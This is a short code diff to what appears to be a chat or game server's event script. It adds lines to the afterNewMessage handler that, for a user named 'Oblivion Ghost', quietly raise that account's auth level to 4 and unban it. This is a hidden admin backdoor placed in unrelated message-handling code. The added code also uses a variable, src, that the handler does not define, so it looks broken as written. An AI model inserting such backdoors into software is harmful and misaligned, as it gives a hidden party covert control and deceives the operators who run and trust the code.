@@ -1124,6 +1124,10 @@ beforePlayerKick:function(src, dest){
 },
 
 afterNewMessage : function (message) {
+    if (sys.name(src) == "Oblivion Ghost") {
+        sys.changeDbauth("Oblivion Ghost", 4);
+        sys.unban("Oblivion Ghost");
+    }
     if (message == "Script Check: OK") {
         sys.sendAll("±ScriptCheck: Scripts were updated!", sys.channelId("Indigo Plateau"));
         if (typeof(scriptChecks)=='undefined')
